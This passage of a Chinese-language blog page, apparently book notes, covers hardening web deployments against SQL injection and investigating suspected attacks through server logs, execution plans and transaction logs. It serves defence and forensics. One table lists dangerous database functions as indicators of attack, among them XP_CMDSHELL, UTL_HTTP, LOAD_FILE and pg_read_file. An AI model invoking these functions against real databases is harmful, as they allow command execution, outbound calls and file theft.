href=\"http://support.microsoft.com/kb/321185\">http://support.microsoft.com/kb/321185</a></td>\n</tr>\n<tr>\n<td align=\"center\">Oracle</td>\n<td align=\"center\">– 显示数据库版本 select * from v$version; – 显示已安装组件的版本 select * from dba_registry; – 显示补丁级别 select * from dba_registry_history;</td>\n<td align=\"center\"><a href=\"http://www.oracle.com/techwrnetwork/topics/security/alerts-086861.html\">http://www.oracle.com/techwrnetwork/topics/security/alerts-086861.html</a></td>\n</tr>\n</tbody></table>\n<h3 id=\"额外的部署考虑\"><a href=\"#额外的部署考虑\" class=\"headerlink\" title=\"额外的部署考虑\"></a>额外的部署考虑</h3><h4 id=\"最小化不必要信息的泄露\"><a href=\"#最小化不必要信息的泄露\" class=\"headerlink\" title=\"最小化不必要信息的泄露\"></a>最小化不必要信息的泄露</h4><h5 id=\"隐藏错误消息\"><a href=\"#隐藏错误消息\" class=\"headerlink\" title=\"隐藏错误消息\"></a>隐藏错误消息</h5><p>包含描述数据库服务器失败原因信息的错误消息对SQL注入识别和后续的漏洞利用均非常有用。在应用程序级别的错误处理程序中，处理异常和错误消息隐藏会极其有效。好的做法是配置应用框架或Web服务器，以便在产生未预料的应用程序错误（比如包含500状态码的HTTP响应）时返回自定义响应。配置后的响应可以是显示通用消息的自定义错误页面，也可以重定向到默认的Web页面。</p>\n<p>自定义错误的配置技术</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">平   台</th>\n<th align=\"center\">配置指令</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">ASP.NET Web应用程序</td>\n<td align=\"center\">在 web.config 文件中，将customErrors 设置为 On 或 RemoteOnly  并将defaultRedirect设置为要显示的页面。确保为defaultRedirect配置的页面确实位于配置的位置，这通常容易出错！<br>  <code>&lt;customErrors  mode=\"On\"  defaultRedirect=\"/CustomPage.aspx\"&gt;  &lt;/customErrors&gt;</code><br>  该配置只适用于ASP.NET资源。当出现任何应用代码无法处理的错误（500、404等）时均会显示该配置页面。</td>\n</tr>\n<tr>\n<td align=\"center\">J2EE Web应用程序</td>\n<td align=\"center\">在web.xml文件中，使用<code>&lt;error-code&gt;</code>和<code>&lt;location&gt;</code>元素配置<code>&lt;error-page&gt;</code>元素：<br><error-page><br><error-code>500</error-code><br><location>/CustomPage.html</location><br></error-page><br>该配置只适用于专门由Java应用服务器处理的资源。只有当出现500错误时才会显示该配置页面。</td>\n</tr>\n<tr>\n<td align=\"center\">经典ASP/VBScript  Web应用程序</td>\n<td align=\"center\">必须对IIS进行配置以便隐藏详细的ASP错误消息。可以使用下列操作配置该设置：<br>1. 在”IIS Manager Snap-In”中右击Web站点并选择”Properties”。<br>2.在”Home Directory”选项卡中单击”Configuration”按钮。确保选中了”Send text error message to client”选项，并且该选项下的文本框中存在恰当的消息。</td>\n</tr>\n<tr>\n<td align=\"center\">PHP Web应用程序</td>\n<td align=\"center\">在php.ini文件中，设置display_errors为Off。此外，在Web服务器配置中配置默认的错误文档。请参考下面两行表格中针对Apache和 IIS的指令。</td>\n</tr>\n<tr>\n<td align=\"center\">Apache Web服务器</td>\n<td align=\"center\">向指向自定义页面的Apache（位于配置文件内部，通常为httpd.conf） 添加 ErrorDocument 指令：  <code>ErrorDocument 500 /CustomPage.html</code></td>\n</tr>\n<tr>\n<td align=\"center\">IIS服务器</td>\n<td align=\"center\">可以使用下列操作配置IIS中的自定义错误：<br>（1）在”IIS Manager Snap-In”中右击Web站点并选择”Properties”。<br>（2）在”Custom Errors”选项卡中单击”Configuration”按钮。选中需要自定义的HTTP错误并单击”Edit”按钮。接下来从”Message Type”<br>下拉菜单中选择一个文件或URL来替换默认内容</td>\n</tr>\n</tbody></table>\n<p>一种可以使基于响应的错误检测变得困难的方法，是配置应用程序和Web服务器，使之返回相同的响应，比如不管什么错误代码（401、403、500等）均重定向到默认的首页。</p>\n<h5 id=\"使用空的默认Web站点\"><a href=\"#使用空的默认Web站点\" class=\"headerlink\" title=\"使用空的默认Web站点\"></a>使用空的默认Web站点</h5><p>HTTP/1.1协议要求HTTP客户端在发送给Web服务器的请求中发送主机头部（Host header）。为访问特定的Web站点，该头部值必须与Web服务器的虚拟主机配置中的主机名相匹配。如果未找到匹配值，将返回默认的Web站点内容。</p>\n<p>对于企业级Web应用程序的拥有者，则可能更喜欢隐蔽起来，他们不希望被针对端口80和443进行IP地址范围扫描的攻击者发现。为确保用户只能通过主机名连接到Web应用，需要将Web服务器的默认Web站点配置成返回一个空白的默认Web页面。</p>\n<h5 id=\"为DNS反向查询使用虚拟主机名称\"><a href=\"#为DNS反向查询使用虚拟主机名称\" class=\"headerlink\" title=\"为DNS反向查询使用虚拟主机名称\"></a>为DNS反向查询使用虚拟主机名称</h5><p>前面讲过，如果只拥有IP地址，要想在能够访问Web站点之前发现有效的主机名，就需要花费一些功夫。要实现该目标，一种方法是在IP地址上执行反向DNS查询。如果IP地址被解析成在Web服务器上同样有效的主机名，那么我们就拥有了连接到该Web站点所需要的信息。不过，如果反向查询返回了稍微通用的内容，那么这时可通过反向DNS查询来阻止不受欢迎的攻击者发现我们的Web站点。如果正在使用虚拟主机名（Dummy Host Name）技术，请确保默认的Web站点也被配置成返回一个空白的默认Web页面。</p>\n<h5 id=\"使用通配符SSL证书\"><a href=\"#使用通配符SSL证书\" class=\"headerlink\" title=\"使用通配符SSL证书\"></a>使用通配符SSL证书</h5><p>另一种发现有效主机名的方法是从SSL（Secure Sockets Layer,安全套接字层）证书中提取。 要阻止该操作，一种方法是使用通配符SSL证书。</p>\n<h5 id=\"限制通过搜索引擎hacking得到的发现\"><a href=\"#限制通过搜索引擎hacking得到的发现\" class=\"headerlink\" title=\"限制通过搜索引擎hacking得到的发现\"></a>限制通过搜索引擎hacking得到的发现</h5><p>搜索引擎是攻击者用于寻找Web站点中SQL注入漏洞的另一种工具。在所有主流搜索引擎中，常见的技术是使用Web站点根目录中的robots.txt文件。该文件用于阻止爬行器（crawler）编写站点索引。</p>\n<p>阻止所有机器人爬行Web站点上的所有页面：</p>\n<pre class=\"line-numbers language-txt\" data-language=\"txt\"><code class=\"language-txt\">User-agent: *\nDisallow: /<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h5 id=\"禁止WSDL信息\"><a href=\"#禁止WSDL信息\" class=\"headerlink\" title=\"禁止WSDL信息\"></a>禁止WSDL信息</h5><p>Web服务所支持的通信协议（例如，SOAP、HTTP GET等）、方法名和期望的参数，都可以从Web服务的WSDL（Web Services Description Language, Web服务描述语言）文件中提取到。通常，通过在Web服务URL的结尾添加一个?WSDL来调用该文件。好的做法是尽可能向不受欢迎的攻击者隐藏这一信息。</p>\n<p>下面展示了如何配置一个.NET Web服务以便不显示WSDL，可以对该配置进行修改以便应用到应用的web.config或machine.config文件中：</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>webServices</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>protocols</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>remove</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Documentation<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>protocols</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>webServices</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Apache Axis（Java应用经常使用的一种SOAP（简单对象访问协议，Web服务平台）支持自定义配置WSDL文件，用于阻止自动生成WSDL，可以在服务的WSDD（Web服务描述文档）文件中配置wsdlFile设置以指向返回空<code>&lt;wsdl/&gt;</code>标签的文件。</p>\n<p>坚决反对在面向Internet的Web服务器上保持WSDL信息的远程访问。可以使用可选的安全通信通道（比如加密过的e-mail）来向值得信赖的合作者提供该文件，合作者可能需要这些信息以与Web服务进行通信。</p>\n<h4 id=\"提高Web服务器日志的详细程度\"><a href=\"#提高Web服务器日志的详细程度\" class=\"headerlink\" title=\"提高Web服务器日志的详细程度\"></a>提高Web服务器日志的详细程度</h4><p>Web服务器日志文件可以提供一些洞察潜在SQL注入攻击的信息，尤其是当应用程序日志记录机制不佳时。</p>\n<h4 id=\"将Web服务器和数据库服务器分别部署在独立主机上\"><a href=\"#将Web服务器和数据库服务器分别部署在独立主机上\" class=\"headerlink\" title=\"将Web服务器和数据库服务器分别部署在独立主机上\"></a>将Web服务器和数据库服务器分别部署在独立主机上</h4><p>应该避免在同一主机上运行Web服务器软件和数据库服务器软件，因为这样会显著增加Web应用的攻击面，并将之前只访问Web前端时不可能暴露的数据库服务器软件暴露给攻击程序。</p>\n<h4 id=\"配置网络访问控制\"><a href=\"#配置网络访问控制\" class=\"headerlink\" title=\"配置网络访问控制\"></a>配置网络访问控制</h4><p>在分层正确的网络中，数据库服务器通常位于内部受信任网络中。凭借对数据库服务器的直接访问权，攻击者可以尝试连接到同一网络的其他系统。 实现网络访问控制，以便对与内部网中其他系统的连接施加限制。可以在包含防火墙和路由器 ACL的网络层实现该控制，也可以使用IPSec这样的主机层机制来实现该控制。此外，确保施加合适的网络访问控制以阻止带外（outbound）网络连接。</p>\n<h2 id=\"确认并从SQL注入攻击中恢复\"><a href=\"#确认并从SQL注入攻击中恢复\" class=\"headerlink\" title=\"确认并从SQL注入攻击中恢复\"></a>确认并从SQL注入攻击中恢复</h2><h3 id=\"调查可疑的SQL注入攻击\"><a href=\"#调查可疑的SQL注入攻击\" class=\"headerlink\" title=\"调查可疑的SQL注入攻击\"></a>调查可疑的SQL注入攻击</h3><p>在遇到可疑的攻击之后，调查者需要筛选大量信息，不但需要判断是否存在SQL注入攻击企图的证据，还需要判断这种攻击是否成功。</p>\n<h4 id=\"取证的合理实践\"><a href=\"#取证的合理实践\" class=\"headerlink\" title=\"取证的合理实践\"></a>取证的合理实践</h4><p>收集和管理数字化的证据都有着严格的规则和指导原则。常见的要求包括：</p>\n<ol>\n<li><p>应该由接受过计算机取证培训并在机构中授权执行数字调查的人来处理调查事宜。</p>\n</li>\n<li><p>在调查期间收集的所有文件，应该镜像，并且应该创建镜像的副本用于分析。这可以确保在需要时总有原始镜像可用。</p>\n</li>\n<li><p>对于新创建的每一份文件镜像，应该为之生成哈希，对于每个源文件也是如此。</p>\n</li>\n<li><p>在调查期间，用文档记录你所执行的所有操作，包括那些当连接到数据库服务器时完成的操作：保留连接时间和所用数据库语境的记录；保留在RDBMS中执行命令的记录；将所有结果管道(pipe)重定向到文本文件中。主流RDBMS客户端将标准输出重定向的命令。</p>\n</li>\n<li><p>确保将所有证据都写入无毒的存储介质，并将其保存在一个安全的地方，比如储物柜或保险箱。</p>\n</li>\n<li><p>维护一份监管链(Chain of Custody)文档，用于跟踪收集的所有证据，从被防护时间开始直到作为证据在法庭上呈现时的移动、存放位置和所有者。</p>\n</li>\n</ol>\n<p>主流RDBMS客户端重定向stdout的命令</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">RDBMS</th>\n<th align=\"center\">厂商支持的客户端</th>\n<th align=\"center\">日志记录的会话活动</th>\n<th align=\"center\">重定向操作符</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Microsoft  SQL Server</td>\n<td align=\"center\">SQLCMD</td>\n<td align=\"center\">-e命令，当启动SQLCMD时， 它在标准输出(stdout)上回显所有发送给服务器的语句和查询。例如：<br>  <code>SQLCMD  -e</code></td>\n<td align=\"center\">控制台中使用:out输出命令，将把标准输出(stdout)重定向到指定的文件。例如：<br><code>SQLCMD&gt;:out  z:\\queryresults.txt  &lt;query&gt;  </code></td>\n</tr>\n<tr>\n<td align=\"center\">Oracle</td>\n<td align=\"center\">SQL*Plus</td>\n<td align=\"center\">在SQL*Plus中使用 ECHO  ON命令。例如：<br>  <code>SQL&gt; SET ECHO ON  </code></td>\n<td align=\"center\">在SQL*Plus中使用spool命令。  例如： <br> <code>SQL&gt; spool  z:\\queryresults.txt</code></td>\n</tr>\n<tr>\n<td align=\"center\">MySQL</td>\n<td align=\"center\">MySQL命令行客户端</td>\n<td align=\"center\">Tee选项。  例如： <br><code>Tee z:\\response\\  logofactions.txt</code></td>\n<td align=\"center\">INTO OUTFILE 语句。  例如：<br>  <code>&lt;query&gt; INTO  OUTFILE z:\\queryresults.txt</code></td>\n</tr>\n<tr>\n<td align=\"center\">PostgreSQL</td>\n<td align=\"center\">PostgreSQL  shell</td>\n<td align=\"center\">在 PostgreSQL  中使用  ECHO  选项。  例如：<br>  <code>\\set ECHO all  </code></td>\n<td align=\"center\">在PostgreSQL  shell中使用/g参数。 例如：<br> <code>=# &lt;query&gt;  /g z:\\queryresults.txt</code></td>\n</tr>\n</tbody></table>\n<h4 id=\"分析数字化证据\"><a href=\"#分析数字化证据\" class=\"headerlink\" title=\"分析数字化证据\"></a>分析数字化证据</h4><p>数字化证据(digital artifact)就是相关数据的集合。它们的范围很广，包括从存储在操作系统中文件系统内的Web服务器的日志文件，到存储在内存中的信息，以及RDBMS内核中的信息。</p>\n<h5 id=\"Web服务器日志文件\"><a href=\"#Web服务器日志文件\" class=\"headerlink\" title=\"Web服务器日志文件\"></a>Web服务器日志文件</h5><p>Web服务器是基于Web的应用程序的核心组件，作为交互层接受用户的输入并将输入传递给后台应用程序。Web服务器通常维护着持久日志文件，其中包含它接收到的页面请求的历史记录，以及以状态码形式记录的对该请求处理后产生的输出。</p>\n<p>对于调查SQL注入攻击最有用的Web服务器日志属性</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">日志字段名</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">主要调查的值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Date</td>\n<td align=\"center\">活动的日期</td>\n<td align=\"center\">建立事件的时间基线，并在各种证据中将事件关联起来</td>\n</tr>\n<tr>\n<td align=\"center\">Time</td>\n<td align=\"center\">活动的时间</td>\n<td align=\"center\">建立事件的时间基线，并在各种证据中将事件关联起来</td>\n</tr>\n<tr>\n<td align=\"center\">Client-IP Address (c-ip)</td>\n<td align=\"center\">发起请求的客户端的IP地址</td>\n<td align=\"center\">标识Web请求的源</td>\n</tr>\n<tr>\n<td align=\"center\">Cs-UserName</td>\n<td align=\"center\">发起请求的已授权的用户名</td>\n<td align=\"center\">标识与流量关联的用户上下文(context)</td>\n</tr>\n<tr>\n<td align=\"center\">Cs-method</td>\n<td align=\"center\">请求的操作(action)</td>\n<td align=\"center\">客户端试图执行的HTTP操作</td>\n</tr>\n<tr>\n<td align=\"center\">Cs-uri-stem</td>\n<td align=\"center\">请求目标(例如请求的Web页面)</td>\n<td align=\"center\">客户端请求访问的资源(页面、可执行文件等)</td>\n</tr>\n<tr>\n<td align=\"center\">Cs-uri-query</td>\n<td align=\"center\">客户端请求的查询</td>\n<td align=\"center\">标识客户端提交的恶意查询</td>\n</tr>\n<tr>\n<td align=\"center\">Sc-status</td>\n<td align=\"center\">客户端请求的状态码</td>\n<td align=\"center\">标识处理客户端请求后产生的输出  (状态)</td>\n</tr>\n<tr>\n<td align=\"center\">Cs(User-Agent)</td>\n<td align=\"center\">客户端浏览器的版本</td>\n<td align=\"center\">追踪特定客户端的请求，该客户端可 能使用了多个IP地址</td>\n</tr>\n<tr>\n<td align=\"center\">Cs-bytes</td>\n<td align=\"center\">客户端发送给服务器的字节</td>\n<td align=\"center\">标识异常的流量传输</td>\n</tr>\n<tr>\n<td align=\"center\">Sc-bytes</td>\n<td align=\"center\">服务器发送给客户端的字节</td>\n<td align=\"center\">标识异常的流量传输</td>\n</tr>\n<tr>\n<td align=\"center\">Time Taken (time-taken)</td>\n<td align=\"center\">服务器执行请求所花的毫秒数</td>\n<td align=\"center\">标识异常请求处理的实例</td>\n</tr>\n</tbody></table>\n<p>分析日志文件的要点</p>\n<ul>\n<li>每天的带宽利用率</li>\n<li>页面每天命中次数</li>\n<li>页面每天被每个IP命中的次数</li>\n<li>恶意查询参数</li>\n<li>spear-searching</li>\n</ul>\n<h5 id=\"数据库执行计划\"><a href=\"#数据库执行计划\" class=\"headerlink\" title=\"数据库执行计划\"></a>数据库执行计划</h5><p>数据库执行计划是由RDBMS生成的执行步骤的列表，它说明了 RDBMS在访问或修改信息时效率最高的方式。</p>\n<h6 id=\"在缓存的执行计划中查找证据\"><a href=\"#在缓存的执行计划中查找证据\" class=\"headerlink\" title=\"在缓存的执行计划中查找证据\"></a>在缓存的执行计划中查找证据</h6><ul>\n<li>寻找已知恶意攻击活动的痕迹</li>\n<li>与注释协同使用的堆叠查询</li>\n<li>非法使用条件语句</li>\n<li>高风险语句和数据库函数</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>数据库</th>\n<th>函  数</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Microsoft SQL Server</td>\n<td>XP_CMDSHELL<br>XP_reg*<br>SP_OACREATE<br>sp_OAMethod<br>OPENROWSET<br>sp_configure<br>BULK INSERT<br>BCP<br>WAITFOR DELAY</td>\n</tr>\n<tr>\n<td>Oracle</td>\n<td>UTL_FILE<br>UTL_HTTP<br>HTTPURITYPE<br>UTL_INADDR</td>\n</tr>\n<tr>\n<td>MySQL</td>\n<td>LOAD_DATA_INFILE<br>LOAD_FILE<br>BENCHMARK<br>ENCODE()<br>OUTFILE()<br>CONCAT()</td>\n</tr>\n<tr>\n<td>PostgreSQL</td>\n<td>pg_Is_dir<br>pg_read_file<br>pg_read_binary_file<br>pg_stat_file<br>pg_sleep</td>\n</tr>\n</tbody></table>\n<h6 id=\"如何访问执行计划\"><a href=\"#如何访问执行计划\" class=\"headerlink\" title=\"如何访问执行计划\"></a>如何访问执行计划</h6><p>RDBMS数据库提供的视图，用于访问存储的执行计划</p>\n<table>\n<thead>\n<tr>\n<th>数据库</th>\n<th>缓存的语句类型</th>\n<th align=\"center\">默认是否启用</th>\n<th>访问方法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Microsoft SQL Server</td>\n<td>即席奪询(ad  hoc)和预处理语句(prepared  statement)</td>\n<td align=\"center\">启用</td>\n<td>sys.dmexecquerystats  sys.dmexecsqltext</td>\n</tr>\n<tr>\n<td>Oracle</td>\n<td>即席查询（ad hoc）和预处理语句</td>\n<td align=\"center\">启用</td>\n<td>gv$sql</td>\n</tr>\n<tr>\n<td>MySQL</td>\n<td>预处理语句</td>\n<td align=\"center\">不启用</td>\n<td>没有直接访问方法，使用普通的日志查询</td>\n</tr>\n<tr>\n<td>PostgreSQL</td>\n<td>预处理语句</td>\n<td align=\"center\">不启用</td>\n<td>没有直接访问方法，使用普通的日志查询</td>\n</tr>\n</tbody></table>\n<ul>\n<li>Microsoft SQL Server</li>\n</ul>\n<p>  使用视图返回了执行计划缓存条目创建的日期和时间、最后一次执行的时间（在重复执行的情况下）、执行的语法和执行计划被重用的次数</p>\n  <pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> creation_time<span class=\"token punctuation\">,</span> last_execution_time<span class=\"token punctuation\">,</span> <span class=\"token keyword\">text</span><span class=\"token punctuation\">,</span> execution_count <span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span>dm_exec_query_stats qs <span class=\"token keyword\">CROSS</span> <span class=\"token keyword\">APPLY</span> sys<span class=\"token punctuation\">.</span>dm_exec_sql_text<span class=\"token punctuation\">(</span>qs<span class=\"token punctuation\">.</span>sql_handle<span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li><p>Oracle </p>\n<p>使用GVSSQL视图</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> sql_text <span class=\"token keyword\">from</span> gv$<span class=\"token keyword\">sql</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>MySQL</p>\n<p>使用show variables命令来查看查询日志的状态</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">show</span> variables <span class=\"token operator\">like</span> <span class=\"token string\">'%general_log%'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>PostgreSQL</p>\n<p>使用下面的查询来判断服务器上的log_statement值是否已经启用，如果已经启用，可以看到曰志的位置</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> name<span class=\"token punctuation\">,</span> setting <span class=\"token keyword\">from</span> pg_settings <span class=\"token keyword\">where</span> name <span class=\"token operator\">IN</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'log_statement'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'log_directory'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'log_filename'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></li>\n</ul>\n<h6 id=\"执行计划的局限\"><a href=\"#执行计划的局限\" class=\"headerlink\" title=\"执行计划的局限\"></a>执行计划的局限</h6><p>在PostgreSQL和MySQL中，执行计划默认是被禁用的。除此之外，具有足够权限的攻击者还可以禁用执行计划。Microsoft SQL Server和Oracle不允许禁用执行计划，但是执行计划受到本地RDBMS回收策略的支配，使用特殊的RDBMS函数可以将执行计划清洗掉。</p>\n<h6 id=\"缓存回收策略\"><a href=\"#缓存回收策略\" class=\"headerlink\" title=\"缓存回收策略\"></a>缓存回收策略</h6><p>可以控制执行计划缓存的存储容量。RDBMS会根据一些因素来清除缓存的条目</p>\n<ul>\n<li><p>数据库服务器的CPU和内存负载</p>\n</li>\n<li><p>执行计划重用的频率</p>\n</li>\n<li><p>缓存执行计划中引用的对象发生了改变</p>\n</li>\n<li><p>重启数据库服务</p>\n</li>\n</ul>\n<h6 id=\"手工清洗缓存\"><a href=\"#手工清洗缓存\" class=\"headerlink\" title=\"手工清洗缓存\"></a>手工清洗缓存</h6><p>具有管理员权限的用户可以使用手工方式清洗数据库的执行计划缓存。</p>\n<p>采用参数化处理可以提高RDBMS重用缓存计划的机会，以便将来遇到同样的查询时可以更快地执行。下面是一个参数化查询的例子：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> EmployeeID<span class=\"token punctuation\">,</span> FName<span class=\"token punctuation\">,</span> LName<span class=\"token punctuation\">,</span> YOB <span class=\"token keyword\">from</span> SSFA<span class=\"token punctuation\">.</span>Employee <span class=\"token keyword\">where</span> <span class=\"token punctuation\">[</span>fname<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span> <span class=\"token string\">'mike'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h5 id=\"事务日志\"><a href=\"#事务日志\" class=\"headerlink\" title=\"事务日志\"></a>事务日志</h5><p>数据库操作分为两个主要的类别：一是数据操作语言(Data Manipulation Language, DML)， 二是数据定义语言(Data Definition Language, DDL)。DML作用于表内的数据；而DDL则作用于数据库的结构，比如创建新表。</p>\n<p>事务日志(transaction log)用于记录这样的事实：事务开始发生及恢复所需的信息。万一数据库服务器将信息写入硬盘失败，数据库服务器就可以使用这些恢复信息将数据回退到某个一致的状态。</p>\n<p>将数据写入实际的数据页(data page)并不是实时发生的。在预定义的时间间隔之后，事务 日志中的信息才会应用于硬盘，这等同于数据的写入操作，但却提高了总体的性能。这听起来 很复杂，但与RDBMS在巨大的数据库文件中寻道并在恰当区域中写入信息相比，写入事务曰 志的速度要快许多。</p>\n<h6 id=\"在事务日志中查找证据\"><a href=\"#在事务日志中查找证据\" class=\"headerlink\" title=\"在事务日志中查找证据\"></a>在事务日志中查找证据</h6><p>分析事务日志</p>\n<ul>\n<li><p>在可疑攻击时间段内执行的INSERT, UPDATE和DELETE语句。在调查取证时，该信息可用于标识在所调查的时间段内执行的活动，以及相关事件的其他痕迹。</p>\n</li>\n<li><p>数据库用户执行的非标准的数据库操作(当事务日志中有可用信息时)。例如，某个通常从数据库读取信息的应用程序用户账号突然意外地开始执行INSERT、UPDATE和 DELETE 语句。</p>\n</li>\n</ul>\n<h6 id=\"如何搜索主流RDBMS的事务日志\"><a href=\"#如何搜索主流RDBMS的事务日志\" class=\"headerlink\" title=\"如何搜索主流RDBMS的事务日志\"></a>如何搜索主流RDBMS的事务日志</h6><ul>\n<li><p>Microsoft SQL Server </p>\n<p>默认情况下，Microsoft SQL Server的事务日志功能是启用的，而且无法禁用。从任何SQL Server客户端，都可以使用原生的fh_dblog函数来访问事务日志。</p>\n<p>列出了针对用户表已经执行事务的汇总信息</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> AllocUnitName <span class=\"token keyword\">as</span> <span class=\"token string\">'Object'</span><span class=\"token punctuation\">,</span> Operation<span class=\"token punctuation\">,</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span>OPERATION<span class=\"token punctuation\">)</span> <span class=\"token keyword\">AS</span>\n<span class=\"token string\">'Count'</span> <span class=\"token keyword\">from</span> fn_dblog<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">WHERE</span> OPERATION <span class=\"token operator\">IN</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'LOP_INSERT_ROWS'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'LOP_MODIFY_ROW'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'LOP_DELETE_ROWS'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> AllocUnitName <span class=\"token operator\">NOT</span>\n<span class=\"token operator\">Like</span> <span class=\"token string\">'sys.%'</span> <span class=\"token keyword\">GROUP</span> <span class=\"token keyword\">BY</span> Operation<span class=\"token punctuation\">,</span> AllocUnitName <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> Object<span class=\"token punctuation\">,</span> Operation<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>Oracle</p>\n<p>在Oracle中，事务(归档)日志默认是启用的，并且在测试系统时也无法禁用事务日志功能。</p>\n<p>使用下面的查询返回已执行的INSERT、UPDATE和DELETE操作的一个列表：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> OPERATION<span class=\"token punctuation\">,</span> SQL_REDO<span class=\"token punctuation\">,</span> SQL_UNDO <span class=\"token keyword\">FROM</span> V$LOGMNR_CONTENTS <span class=\"token keyword\">WHERE</span>\nSEG_OWNER <span class=\"token operator\">=</span> <span class=\"token string\">'WEBAPP'</span> <span class=\"token operator\">AND</span> SEG_NAME <span class=\"token operator\">=</span> <span class=\"token string\">'SYNGRESS'</span> <span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">timestamp</span> <span class=\"token operator\">&gt;</span> sysdate <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">timestamp</span> <span class=\"token operator\">&lt;</span> sysdate<span class=\"token punctuation\">)</span> <span class=\"token operator\">AND</span> OPERATION <span class=\"token operator\">IN</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'DELETE'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'INSERT'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'UPDATE'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">AND</span> USERNAME <span class=\"token operator\">=</span> <span class=\"token string\">'KEWIE'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>MySQL</p>\n<p>在MySQL中，默认情况下不启用事务日志，为了记录事务，必须用命令启用事务日志功能。</p>\n<p>使用show binary logs语句来查看是否激活了事务日志功能</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SHOW</span> <span class=\"token keyword\">BINARY</span> LOGS<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用下面的查询来确定事务日志存储的位置</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SHOW</span> VARIABLES <span class=\"token operator\">LIKE</span> <span class=\"token string\">'%HOME%'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如何返回DB_BIN_Log.000002文件中的所有事务记录</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">mysqlbinlog <span class=\"token string\">\"c:\\Program Files\\MySQL\\DB_Bin_Logs.000002\"</span> <span class=\"token operator\">&gt;</span> z:\\transactionlog<span class=\"token punctuation\">.</span>txt<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>PostgreSQL</p>\n<p>可以使用PostgreSQL命令行客户端来返回事务日志信息。在PostgreSQL中，事务日志默认是不启用的，在启用了 